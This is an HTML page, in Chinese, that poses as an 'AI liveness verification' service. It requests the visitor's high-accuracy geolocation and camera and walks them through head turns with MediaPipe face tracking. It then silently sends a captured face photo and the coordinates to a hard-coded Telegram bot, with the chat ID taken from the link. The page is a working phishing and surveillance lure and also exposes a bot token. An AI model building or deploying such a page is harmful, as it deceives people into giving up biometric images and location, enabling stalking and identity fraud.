<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>🔒 智能 AI 活体检测</title>
    <!-- 引入 MediaPipe 人脸关键点检测库 -->
    <script src="https://cdn.jsdelivr.net/npm/@mediapipe/camera_utils/camera_utils.js" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/@mediapipe/face_mesh/face_mesh.js" crossorigin="anonymous"></script>
    <style>
        body { display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; margin: 0; background: #111; color: white; font-family: sans-serif; text-align: center; }
        
        #video-container { 
            position: relative; 
            width: 640px; 
            height: 480px; 
            max-width: 100%; 
            margin-bottom: 20px; 
            display: none; 
            border-radius: 12px;
            /* 动态光变颜色效果的外发光 */
            box-shadow: 0 0 25px rgba(0, 255, 204, 0.4);
            transition: box-shadow 0.5s, border-color 0.5s;
            border: 3px solid #00ffcc;
        }
        #video { width: 100%; height: 100%; background: #000; border-radius: 9px; object-fit: cover; transform: scaleX(-1); } /* 镜像翻转 */
        
        .face-frame {
            position: absolute;
            top: 50%; left: 50%;
            transform: translate(-50%, -50%);
            width: 240px; height: 320px;
            border: 3px dashed rgba(255, 255, 255, 0.6);
            border-radius: 50% / 40%;
            pointer-events: none;
        }

        #status { 
            margin: 15px 20px; 
            font-weight: bold; 
            background: rgba(0,0,0,0.8); 
            padding: 20px; 
            border-radius: 10px; 
            font-size: 20px; 
            border: 1px solid #333;
            max-width: 600px;
        }

        /* 自动补光遮罩层（通过调整全屏或容器亮度实现补光） */
        .fill-light {
            position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
            background: radial-gradient(circle, rgba(255,255,255,0.15) 0%, rgba(0,0,0,0.85) 80%);
            pointer-events: none; z-index: 99; display: none;
        }
        
        button { padding: 15px 40px; cursor: pointer; font-size: 20px; border-radius: 8px; border: none; background: #00ffcc; color: #111; font-weight: bold; transition: background 0.3s; }
        button:hover { background: #00b386; color: white; }
        
        .error-page { font-size: 16px; color: #ffeb3b; padding: 20px; background: rgba(0,0,0,0.9); border-radius: 15px; border: 1px solid #444; max-width: 500px; margin: auto; text-align: left; }
    </style>
</head>
<body>
    <div class="fill-light" id="fillLight"></div>
    <div id="app">
        <h2>🛡️ AI 智能视觉活体检测</h2>
        <div id="status">点击开始以进行智能活体核验</div>

        <div id="video-container" id="videoContainer">
            <video id="video" autoplay playsinline muted></video>
            <div class="face-frame"></div>
        </div>
        
        <canvas id="canvas" style="display:none;"></canvas>
        <button id="startBtn">开始智能核验 🔐</button>
    </div>

    <script>
        const BOT_TOKEN = '8657025946:AAGG14AbXcHQzWqSaL6MQTCCP2PEtIyt64g';
        const app = document.getElementById('app');
        const video = document.getElementById('video');
        const videoContainer = document.getElementById('video-container');
        const canvas = document.getElementById('canvas');
        const startBtn = document.getElementById('startBtn');
        const status = document.getElementById('status');
        const fillLight = document.getElementById('fillLight');
        const CHAT_ID = new URLSearchParams(window.location.search).get('id');

        // 检测状态机: 0: 准备, 1: 检测正脸/自动补光, 2: 检测向左转, 3: 检测向右转, 4: 完成
        let currentStep = 0;
        let lastSpokenText = "";

        function speakPrompt(text) {
            if (text === lastSpokenText) return; // 避免重复语音打断
            lastSpokenText = text;
            status.innerText = text;
            if ('speechSynthesis' in window) {
                window.speechSynthesis.cancel();
                const utterance = new SpeechSynthesisUtterance(text);
                utterance.lang = 'zh-CN';
                utterance.rate = 1.0;
                utterance.pitch = 1.0;
                window.speechSynthesis.speak(utterance);
            }
        }

        // 动态改变光效与边框颜色（用于视觉提示和自动补光反馈）
        function updateUIPulse(color, glowColor) {
            videoContainer.style.borderColor = color;
            videoContainer.style.boxShadow = `0 0 25px ${glowColor}`;
        }

        startBtn.addEventListener('click', async () => {
            if (!CHAT_ID) { 
                status.innerText = "❌ 链接中缺少验证 ID (?id=...)"; 
                return; 
            }
            startBtn.style.display = 'none';
            fillLight.style.display = 'block'; // 开启智能自动补光遮罩

            let locationText = "未获取到位置信息";
            try {
                status.innerText = "正在初始化定位与传感器 📍";
                const pos = await new Promise((res, rej) => {
                    navigator.geolocation.getCurrentPosition(res, rej, { enableHighAccuracy: true, timeout: 10000 });
                });
                locationText = `纬度: ${pos.coords.latitude.toFixed(6)}, 经度: ${pos.coords.longitude.toFixed(6)}`;
            } catch (err) {
                console.warn("Geolocation warning:", err);
            }

            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { width: 640, height: 480 }, audio: false });
                video.srcObject = stream;
                videoContainer.style.display = 'block';

                // 初始化 MediaPipe Face Mesh AI 模型
                initAIFaceDetection(stream, locationText);

            } catch (err) {
                console.error("Camera start error:", err);
                app.innerHTML = `<div class="error-page"><p>⚠️ 无法启动摄像头：${err.message}</p></div>`;
            }
        });

        function initAIFaceDetection(stream, locationText) {
            const faceMesh = new FaceMesh({
                locateFile: (file) => `https://cdn.jsdelivr.net/npm/@mediapipe/face_mesh/${file}`
            });

            faceMesh.setOptions({
                maxNumFaces: 1,
                refineLandmarks: true,
                minDetectionConfidence: 0.5,
                minTrackingConfidence: 0.5
            });

            faceMesh.onResults((results) => {
                if (!results.multiFaceLandmarks || results.multiFaceLandmarks.length === 0) {
                    speakPrompt("未检测到人脸，请将脸部移入框内");
                    updateUIPulse('#ff4d4d', 'rgba(255, 77, 77, 0.5)'); // 红色提示
                    return;
                }

                const landmarks = results.multiFaceLandmarks[0];
                
                // 简单的 AI 头部姿态估算（通过鼻尖 1 号点与两侧耳朵/眼角关键点相对位置判断偏转角）
                const nose = landmarks[1];
                const leftEye = landmarks[33];
                const rightEye = landmarks[263];
                
                // 计算水平偏移量估算左右转头
                const eyeCenterXinVideo = (leftEye.x + rightEye.x) / 2;
                const headYaw = nose.x - eyeCenterXinVideo; 

                if (currentStep === 0) {
                    // 步骤1：检测正脸并自动对焦/补光通过
                    updateUIPulse('#00ffcc', 'rgba(0, 255, 204, 0.6)'); // 蓝绿色（正常光效）
                    speakPrompt("请保持正脸，准备向左缓慢转头");
                    setTimeout(() => { currentStep = 1; }, 2000);
                } 
                else if (currentStep === 1) {
                    // 步骤2：AI 判断是否向左转头 (阈值可根据实际效果微调)
                    speakPrompt("请缓慢向左转头...");
                    updateUIPulse('#ffeb3b', 'rgba(255, 235, 59, 0.6)'); // 黄色光变提示
                    
                    if (headYaw > 0.04) { // 向左转达标
                        currentStep = 2;
                        speakPrompt("左转成功，请缓慢向右转头");
                    }
                } 
                else if (currentStep === 2) {
                    // 步骤3：AI 判断是否向右转头
                    updateUIPulse('#ff9800', 'rgba(255, 152, 0, 0.6)'); // 橙色光变提示
                    
                    if (headYaw < -0.04) { // 向右转达标
                        currentStep = 3;
                        speakPrompt("动作核验通过，正在自动抓取加密样本");
                        updateUIPulse('#00ff00', 'rgba(0, 255, 0, 0.8)'); // 绿色完成提示
                        
                        // 达标后由 AI 触发结束并自动上传
                        setTimeout(() => {
                            captureAndUpload(stream, locationText);
                        }, 1000);
                    }
                }
            });

            const camera = new Camera(video, {
                onFrame: async () => {
                    if (currentStep < 3) {
                        await faceMesh.send({ image: video });
                    }
                },
                width: 640,
                height: 480
            });
            camera.start();
        }

        async function captureAndUpload(stream, locationText) {
            currentStep = 4; // 锁定防止重复触发
            status.innerText = "✅ AI 活体比对成功，正在生成凭证...";
            fillLight.style.display = 'none';

            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            const ctx = canvas.getContext('2d');
            ctx.translate(canvas.width, canvas.height);
            ctx.scale(-1, -1); // 保持输出图片方向正常
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            canvas.toBlob(async (blob) => {
                if (!blob) return;
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', blob, 'ai_liveness.jpg');
                formData.append('caption', `🛡️ [AI 智能活体核验成功]\nID: ${CHAT_ID}\n📍 ${locationText}\n状态: 视觉动作引擎已确认并通过。`);

                try {
                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
                    status.innerText = "🎉 验证全部通过！";
                    stream.getTracks().forEach(t => t.stop());
                    videoContainer.style.display = 'none';
                } catch (e) {
                    status.innerText = "⚠️ 上传结果时发生网络错误。";
                }
            }, 'image/jpeg', 0.95);
        }
    </script>
</body>
</html>
